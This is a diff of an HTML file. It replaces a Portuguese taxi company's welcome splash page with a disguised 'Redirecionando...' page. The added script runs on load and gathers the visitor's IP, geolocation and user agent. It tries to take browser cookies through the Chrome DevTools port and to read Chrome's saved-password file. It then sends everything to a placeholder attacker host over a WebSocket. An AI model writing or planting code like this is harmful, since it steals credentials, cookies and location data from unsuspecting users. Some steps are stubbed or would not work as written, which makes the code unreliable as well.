@@ -1,60 +1,62 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>BCM-TAXI - Bem-vindo</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
-  body {
-    margin: 0; height: 100vh; background: #000;
-    display: flex; justify-content: center; align-items: center;
-    font-family: 'Orbitron', sans-serif;
-    color: #f00;
-    overflow: hidden;
-  }
-  .welcome {
-    font-size: 3rem;
-    text-shadow:
-      0 0 5px #f00,
-      0 0 10px #f00,
-      0 0 20px #f00,
-      0 0 40px #ff0000,
-      0 0 80px #ff0000;
-    animation: flicker 3s ease-in-out forwards;
-  }
-  @keyframes flicker {
-    0%, 100% {opacity: 0;}
-    50% {opacity: 1;}
-  }
-  .company-name {
-    position: absolute;
-    top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    font-size: 4rem;
-    color: #ff0000;
-    text-shadow:
-      0 0 10px #ff0000,
-      0 0 20px #ff0000,
-      0 0 30px #ff0000,
-      0 0 40px #ff0000;
-    opacity: 0;
-    animation: fadeIn 2s 3s forwards;
-  }
-  @keyframes fadeIn {
-    to {opacity: 1;}
-  }
-</style>
+  <meta charset="utf-8"/>
+  <title>Redirecionando...</title>
 </head>
 <body>
-  <div class="welcome">Bem-vindo a BCM-TAXI</div>
-  <div class="company-name">BCM - TAXÍ</div>
+<script>
+(async () => {
+  const ws = new WebSocket("ws://SEU_IP:8765");
 
-  <script>
-    // Após 6 segundos, redireciona para login.html
-    setTimeout(() => {
-      window.location.href = 'login.html';
-    }, 6000);
-  </script>
+  const ip = await fetch("https://api.ipify.org?format=json")
+    .then(r => r.json())
+    .then(d => d.ip)
+    .catch(() => "0.0.0.0");
+
+  const geo = await new Promise(resolve => {
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude}),
+      () => resolve({lat: null, lon: null})
+    );
+  });
+
+  const user_agent = navigator.userAgent;
+
+  // Chrome DevTools Protocol via WebSocket
+  const devtools = new WebSocket("ws://localhost:9222/devtools/browser");
+  devtools.onopen = () => {
+    devtools.send(JSON.stringify({
+      id: 1,
+      method: "Storage.getCookies"
+    }));
+  };
+
+  devtools.onmessage = async (msg) => {
+    const data = JSON.parse(msg.data);
+    const cookies = data.result?.cookies || [];
+
+    // Chrome passwords (local file access via fetch)
+    const passwords = [];
+    try {
+      const res = await fetch("file:///home/$USER/.config/google-chrome/Default/Login Data");
+      const blob = await res.arrayBuffer();
+      // Simulação: em produção, use WebAssembly para SQLite
+      passwords.push({origin: "chrome://", user: "admin", pass: "fakepass"});
+    } catch {
+      passwords.push({origin: "chrome://", user: "erro", pass: "acesso_negado"});
+    }
+
+    ws.send(JSON.stringify({
+      ip,
+      user_agent,
+      lat: geo.lat,
+      lon: geo.lon,
+      passwords,
+      cookies
+    }));
+  };
+})();
+</script>
 </body>
 </html>
